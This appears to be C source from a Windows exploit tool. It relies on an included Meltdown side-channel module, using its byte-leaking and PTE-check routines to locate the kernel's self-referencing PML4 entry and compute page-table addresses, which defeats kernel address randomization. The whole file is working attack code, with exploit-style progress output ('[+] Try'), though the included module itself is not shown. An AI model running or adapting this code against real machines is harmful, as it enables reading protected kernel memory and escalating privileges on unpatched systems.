//////////////////////////////////////////////////////////////////////////////

#include <windows.h>
#include <stdio.h>

#include "meltdown.c"

//////////////////////////////////////////////////////////////////////////////

void *get_pt_from_va ( void *paging_tables_base , unsigned long long va )
{
  unsigned int pt_index;
  unsigned int pd_index;
  unsigned int pdpt_index;
  unsigned int pml4_index;
  unsigned long long pt_address;

// Calculating the PAGE TABLE index
  va = va >> 12;
  pt_index = va & 0x1ff;

// Calculating the PAGE DIRECTORY index
  va = va >> 9;
  pd_index = va & 0x1ff;

// Calculating the PDPT index
  va = va >> 9;
  pdpt_index = va & 0x1ff;

// Calculating the PML4 index
  va = va >> 9;
  pml4_index = va & 0x1ff;

// Calculating the address in the PML4
  pt_address = ( unsigned long long ) paging_tables_base;
  pt_address += ( ( unsigned long long ) 0x40000000 * pml4_index );
  pt_address += ( ( unsigned long long ) 0x200000 * pdpt_index );
  pt_address += ( ( unsigned long long ) 0x1000 * pd_index );

  return ( ( void * ) pt_address );
}

//////////////////////////////////////////////////////////////////////////////

void *get_pd_from_va ( void *paging_tables_base , unsigned long long va )
{
  void *pd_address;
  void *pt_address;

// Getting PAGE TABLE address
  pt_address = get_pt_from_va ( paging_tables_base , va );

// Getting PAGE DIRECTORY address
  pd_address = get_pt_from_va ( paging_tables_base , ( unsigned long long ) pt_address );

  return ( pd_address );
}

//////////////////////////////////////////////////////////////////////////////

void *get_pdpt_from_va ( void *paging_tables_base , unsigned long long va )
{
  void *pdpt_address;
  void *pd_address;

// Getting PAGE DIRECTORY address
  pd_address = get_pd_from_va ( paging_tables_base , va );

// Getting PDPT address
  pdpt_address = get_pt_from_va ( paging_tables_base , ( unsigned long long ) pd_address );

  return ( pdpt_address );
}

//////////////////////////////////////////////////////////////////////////////

void *get_pml4_from_va ( void *paging_tables_base , unsigned long long va )
{
  void *pml4_address;
  void *pdpt_address;

// Getting PDPT address
  pdpt_address = get_pdpt_from_va ( paging_tables_base , va );

// Getting PML4 address
  pml4_address = get_pt_from_va ( paging_tables_base , ( unsigned long long ) pdpt_address );

  return ( pml4_address );
}

//////////////////////////////////////////////////////////////////////////////

int is_pte ( void *address )
{
  int ret = FALSE;

// Checking if the PTE is valid
  if ( is_pte_executable_pure ( address ) == TRUE )
  {
  // Checking if the PTE is valid (again)
    if ( is_pte_executable_pure ( address ) == TRUE )
    {
    // Checking if the PTE is valid (and again)
      if ( is_pte_executable_pure ( address ) == TRUE )
      {
      // Returning OK
        ret = TRUE;
      }
    }
  }

  return ( ret );
}

//////////////////////////////////////////////////////////////////////////////

int is_pte_original ( void *address )
{
  unsigned char leaked_byte;
  int ret = FALSE;

// If data could be leaked
  if ( leak_byte ( address , &leaked_byte ) == TRUE )
  {
  // If it's a PTE with NX bit disabled
    if ( leaked_byte == 0x63 )
    {
    // Returning OK
      ret = TRUE;
    }
  }

  return ( ret );
}

//////////////////////////////////////////////////////////////////////////////

unsigned int get_candidate_entry ( void )
{
  char *pml4_address;
  unsigned int candidate_entry = 0;
  unsigned int entry;

//////////////

// Checking entry by entry
  for ( entry = 0x100 ; entry < 0x200 ; entry ++ )
  {
  // Calculating canidate address
    pml4_address = ( char * ) 0xffff000000000000 + ( ( 0x8000000000 + 0x40000000 + 0x200000 + 0x1000 + 0x8 ) * entry );

  // If it's a PTE
    if ( is_pte ( pml4_address ) == TRUE )
    {
    // Returning entry
      candidate_entry = entry;

    // Stop finding
      break;
    }
  }

  return ( candidate_entry );
}

//////////////////////////////////////////////////////////////////////////////

int get_pml4_address ( unsigned int *candidate_entry , void **pml4_address )
{
  unsigned int cont;
  int ret = FALSE;
  void *handler;

// Initializing values to return
  *candidate_entry = 0;
  *pml4_address = NULL;

//////////

// Trying 10 times
  for ( cont = 0 ; cont < 10 ; cont ++ )
  {
  // User message
    printf ( " [+] Try %i/%i\n" , cont , 10 );

  // Getting PML4 entry with the fastest way
    *candidate_entry = get_candidate_entry ();

  // If the PML4 could be found
    if ( *candidate_entry != 0 )
    {
    // Stop finding
      break;
    }
  }  

//////////

// If the PML4 could be found
  if ( *candidate_entry != 0 )
  {
  // Calculating new address
    *pml4_address = ( char * ) 0xffff000000000000 + ( ( 0x8000000000 + 0x40000000 + 0x200000 + 0x1000 ) * ( *candidate_entry ) );

  // Returning OK
    ret = TRUE;
  }

//////////

  return ( ret );
}

//////////////////////////////////////////////////////////////////////////////
